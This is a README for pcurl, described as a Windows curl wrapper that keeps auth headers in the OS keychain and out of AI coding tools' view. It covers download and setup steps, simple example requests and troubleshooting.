# 🔒 pcurl - Keep auth headers out of sight

[![Download pcurl](https://img.shields.io/badge/Download-pcurl-blue?style=for-the-badge&logo=github)](https://github.com/stern-mathematicalstatement418/pcurl)

## 🧭 What pcurl does

pcurl is a small Windows tool that works like curl, but keeps your secret headers away from AI tools.

If you use tools such as Claude Code, Copilot, or Cursor, they can help write commands. But they can also see the text you type. That can include API keys, tokens, and other private headers. pcurl helps with that by using your system keychain for secrets and by keeping them out of your prompt and command history.

Use it when you want the same curl flow, but with less chance of exposing credentials.

## 📥 Download pcurl

Visit this page to download and set up pcurl on Windows:

https://github.com/stern-mathematicalstatement418/pcurl

On that page, look for the latest release or the main download files. Save the Windows version to your computer, then follow the steps below.

## 🪟 Windows setup

pcurl is built for Windows users who want a simple command-line tool.

Before you start, make sure you have:

- Windows 10 or Windows 11
- Permission to run apps on your PC
- Internet access to open the download page
- A way to unzip files if the download comes as a .zip file

If Windows asks whether you want to keep or run the file, choose the option that lets you keep going only if you trust the source and file name.

## 🚀 Getting started

Follow these steps to run pcurl on Windows:

1. Open the download page:
   https://github.com/stern-mathematicalstatement418/pcurl

2. Find the Windows download file or release asset.

3. Download the file to your PC.

4. If the file comes in a .zip folder, open the folder and extract the contents.

5. Move the pcurl file to a place you can find again, such as:
   - Downloads
   - Desktop
   - a tools folder

6. Open Command Prompt or PowerShell.

7. Go to the folder that contains pcurl.

8. Run it the same way you would run curl, but use pcurl instead.

A simple example looks like this:

pcurl https://example.com

If you need headers, pcurl helps keep those secrets in the keychain instead of putting them in plain text in your command line.

## 🔐 How pcurl handles secrets

pcurl is built for secret management.

When you work with auth headers, tokens, or API keys, those values can end up in places you do not want:

- command history
- shell scripts
- AI chat input
- copied text
- shared notes

pcurl helps reduce that risk by using OS keychain integration. That means your secret data stays in the Windows credential store or the system keychain path that the tool uses, rather than sitting in the command you type.

This is useful when you want to:

- call private APIs
- test endpoints with auth headers
- keep bearer tokens out of view
- avoid repeating the same long credential string

## 🧰 Basic use

pcurl is meant to feel like curl.

You still make web requests from the command line. You still pass a URL. You still use headers and options as needed.

A few common use cases:

- fetch a web page
- call a JSON API
- send a POST request
- include authentication
- reuse saved credentials

If you already know curl, the learning curve should be small. If you do not, you can still use pcurl by copying a command and changing the URL or header values you need.

## 🧪 Example tasks

Here are a few examples of where pcurl fits in:

### 🌐 Open a page or endpoint
Use pcurl to check a site or API route.

pcurl https://api.example.com/status

### 🧾 Send data
Use it to send JSON to a service.

pcurl -X POST https://api.example.com/login

### 🛡️ Keep a token private
Store the token in your keychain, then use pcurl to send the request without pasting the token into a chat window.

### 🤖 Use with AI coding tools
If you ask an AI agent to help build a request, you can keep the private parts out of the prompt. That gives you a cleaner workflow when the tool sees your screen, files, or terminal text.

## 🧱 What you need

pcurl is a command-line tool, so it works best if you are fine opening a terminal.

You need:

- a Windows machine
- a downloaded pcurl file
- basic access to Command Prompt or PowerShell
- a browser to open the GitHub page

You do not need to learn a full programming language to use it.

## 🗂️ Common file locations

After download, many users keep pcurl in one of these places:

- Downloads
- Documents
- Desktop
- C:\Tools\pcurl
- a folder you use for command-line apps

If you move the file, keep the name simple. That makes it easier to type in the terminal.

## 🧭 Typical workflow

A simple workflow looks like this:

1. Save a secret in your keychain.
2. Open your terminal.
3. Run pcurl with the request you need.
4. Let pcurl read the stored secret.
5. Review the response from the server.

This is helpful when you repeat the same API call many times.

## 🛠️ Troubleshooting

If pcurl does not open, check these common points:

- The file did not finish downloading.
- You opened the wrong file.
- Windows blocked the app.
- You are not in the folder where the file lives.
- The terminal path does not match the file name.

If the command says it cannot find pcurl, try:

- opening the folder in File Explorer
- copying the file path
- running the command from the same folder
- checking whether the file has an extension like .exe

If a request fails, check:

- the URL
- your internet connection
- the header name
- the token value in the keychain
- whether the server needs a different auth scheme

## 🔎 When to use pcurl

pcurl fits well if you:

- work with private APIs
- use AI coding assistants
- do not want secrets in plain text
- use curl often
- need a cleaner way to manage auth headers

It is a good fit for small tests and daily API work where secret handling matters.

## 📌 Project details

- Repository: pcurl
- Description: Private curl — hide auth headers from AI agents. Drop-in curl wrapper with OS keychain integration.
- Topics: ai-agent, claude-code, cli, copilot, credential-management, curl, cursor, golang, keychain, llm-security, secret-management, security

## 📎 Download again

Use this link if you need to return to the file or check for a newer release:

https://github.com/stern-mathematicalstatement418/pcurl

## 🖥️ Run it from Windows Terminal

If you want a simple path on Windows:

1. Open Windows Terminal, Command Prompt, or PowerShell.
2. Go to the folder where pcurl is saved.
3. Run the file or command from that folder.
4. Use it like curl for your request.

If you plan to use pcurl often, keep it in a fixed folder so you do not have to search for it each time.